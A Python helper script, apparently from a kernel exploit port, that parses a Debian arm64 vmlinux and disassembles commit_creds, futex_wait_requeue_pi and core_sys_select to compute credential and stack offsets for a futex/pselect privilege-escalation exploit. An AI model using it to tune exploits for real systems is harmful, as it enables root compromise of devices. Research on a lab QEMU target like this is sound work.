#!/usr/bin/env python3
"""derive_qemu_target.py — compute the offsets the exploit needs for the QEMU
guest kernel (Debian 5.10.218 arm64), from its vmlinux (with symbols).

Why this exists: the port's target.h is for the OPPO 5.10.236 build; a different
kernel build has different struct layouts and symbol addresses.  Rather than guess,
disassemble the guest's own functions:

  commit_creds        -> task->real_cred / task->cred offsets
  futex_wait_requeue_pi -> where rt_waiter lives in the frame (proves the waiter
                           geometry used by the pselect overlay)
  core_sys_select     -> the stack_fds buffer offset (the primitive's anchor)

  python derive_qemu_target.py <vmlinux>

Prints a C-ready summary of the values, plus the symbol addresses we need.
"""
import struct, sys

try:
    from capstone import Cs, CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN
except ImportError:
    sys.exit('need capstone (pip install capstone)')

TEXT_SCAN = 0x400


def load_elf_symbols(path):
    """Minimal ELF64 symtab reader -> {name: value}."""
    with open(path, 'rb') as f:
        d = f.read()
    if d[:4] != b'\x7fELF' or d[4] != 2:
        sys.exit('not ELF64: %s' % path)
    e_shoff = struct.unpack_from('<Q', d, 0x28)[0]
    e_shentsize = struct.unpack_from('<H', d, 0x3a)[0]
    e_shnum = struct.unpack_from('<H', d, 0x3c)[0]
    e_shstrndx = struct.unpack_from('<H', d, 0x3e)[0]
    secs = []
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        name, typ, flags, addr, offset, size, link, info, align, entsize = \
            struct.unpack_from('<IIQQQQIIQQ', d, off)
        secs.append(dict(name=name, type=typ, addr=addr, offset=offset,
                         size=size, link=link, entsize=entsize))
    # section header string table
    shstr = secs[e_shstrndx]
    def sname(n):
        s = d[shstr['offset'] + n:]
        return s[:s.index(b'\0')].decode()
    syms, strtab = {}, None
    for s in secs:
        if s['type'] == 2:                     # SHT_SYMTAB
            entsize = s['entsize'] or 24
            n = s['size'] // entsize
            st = secs[s['link']]
            strtab = d[st['offset']:st['offset'] + st['size']]
            for i in range(n):
                o = s['offset'] + i * entsize
                nm, info, other, shndx, value, size = struct.unpack_from('<IBBHQQ', d, o)
                if nm == 0:
                    continue
                name = strtab[nm:strtab.index(b'\0', nm)].decode('utf-8', 'replace')
                syms[name] = value
    return syms, secs


def text_bytes(d, secs, syms, name, n=TEXT_SCAN):
    addr = syms.get(name)
    if addr is None:
        return None, 0
    for s in secs:
        if s['type'] == 1 and s['addr'] <= addr < s['addr'] + s['size']:
            off = s['offset'] + (addr - s['addr'])
            return d[off:off + n], addr
    return None, addr


def find_cred_offsets(code, base):
    """commit_creds reads [task+REAL_CRED] and [task+CRED]; arm64 ldr Xt,[Xn,#imm]."""
    md = Cs(CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN)
    hits = []
    for ins in md.disasm(code, base):
        if ins.mnemonic == 'ldr' and '[' in ins.op_str and '#' in ins.op_str:
            try:
                imm = int(ins.op_str.split('#')[1].split(']')[0], 0)
            except ValueError:
                continue
            if 0x700 <= imm <= 0x900:
                hits.append((ins.address, imm, ins.op_str))
    return hits[:12]


def find_frame_local(code, base, mnemonic='add', reg='x2', want_min=0x40, want_max=0x200):
    """Find 'add x2, sp, #imm' style locals (rt_waiter / buffers)."""
    md = Cs(CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN)
    out = []
    for ins in md.disasm(code, base):
        if ins.mnemonic == mnemonic and ins.op_str.startswith(reg + ', sp'):
            try:
                imm = int(ins.op_str.split('#')[1].split(']')[0], 0)
            except (ValueError, IndexError):
                continue
            if want_min <= imm <= want_max:
                out.append((ins.address, imm, ins.op_str))
    return out[:12]


def main():
    path = sys.argv[1]
    with open(path, 'rb') as f:
        d = f.read()
    syms, secs = load_elf_symbols(path)
    print('symbols: %d' % len(syms))
    for s in ('commit_creds', 'prepare_creds', 'init_task', 'init_cred',
              'futex_wait_requeue_pi', 'core_sys_select', '__arm64_sys_pselect6',
              'rt_mutex_wait_proxy_lock', 'rb_erase', '__rb_erase_augmented'):
        v = syms.get(s)
        print('  %-28s %s' % (s, ('0x%016x' % v) if v else 'MISSING'))

    for fn in ('commit_creds', 'futex_wait_requeue_pi', 'core_sys_select'):
        code, base = text_bytes(d, secs, syms, fn)
        if not code:
            print('\n%s: no code' % fn)
            continue
        print('\n=== %s @ 0x%x ===' % (fn, base))
        if fn == 'commit_creds':
            for a, imm, s in find_cred_offsets(code, base):
                print('  ldr [xN,#0x%x]  %s' % (imm, s))
        else:
            for a, imm, s in find_frame_local(code, base):
                print('  %s' % s)


if __name__ == '__main__':
    main()